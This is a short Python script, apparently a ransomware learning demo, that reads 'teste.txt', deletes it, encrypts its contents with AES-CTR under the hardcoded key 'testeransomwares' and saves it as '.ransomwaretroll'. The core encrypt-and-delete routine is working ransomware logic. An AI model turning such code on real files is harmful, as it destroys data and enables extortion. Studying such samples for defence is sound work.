import os
import pyaes

## Nome do arquivo a ser criptografado
file_name = "teste.txt"

## Verifica se o arquivo existe antes de tentar abri-lo
if not os.path.exists(file_name):
    print(f"Erro: O arquivo '{file_name}' não existe.")
    exit()

## Abrir o arquivo e ler os dados
with open(file_name, "rb") as file:
    file_data = file.read()

## Remover o arquivo original
os.remove(file_name)

## Chave de criptografia 
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar os dados
crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado
encrypted_file_name = file_name + ".ransomwaretroll"
with open(encrypted_file_name, "wb") as encrypted_file:
    encrypted_file.write(crypto_data)

print(f"Arquivo criptografado")
